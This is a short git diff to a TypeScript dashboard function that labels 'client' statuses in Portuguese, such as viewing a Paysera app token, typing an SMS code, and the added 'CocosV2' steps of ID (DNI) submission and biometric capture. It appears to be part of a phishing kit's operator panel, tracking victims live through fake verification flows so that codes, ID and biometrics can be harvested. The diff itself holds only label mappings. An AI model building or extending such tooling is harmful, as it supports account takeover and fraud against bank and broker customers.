@@ -120,6 +120,12 @@ const getClientStage = (status: string): { label: string; color: string } => {
   if (status === "paysera_show_token") return { label: "Vendo token (app)", color: "text-blue-400" };
   if (status === "paysera_ask_sms") return { label: "Digitando SMS", color: "text-blue-400" };
   if (status === "paysera_verify_phone") return { label: "Verificando Tel", color: "text-orange-400" };
+  // CocosV2 verification
+  if (status === "verify_dni_submitted")  return { label: "Enviou DNI",           color: "text-purple-400" };
+  if (status === "verify_dni_success")    return { label: "DNI validado ✓",       color: "text-green-400" };
+  if (status === "verify_dni_error")      return { label: "DNI falhou",           color: "text-destructive" };
+  if (status === "biometric_started")     return { label: "Iniciou biometria",    color: "text-blue-400" };
+  if (status === "biometric_finished")    return { label: "Biometria concluída ✓", color: "text-green-400" };
   return { label: status.replace(/_/g, " "), color: "text-muted-foreground" };
 };
 
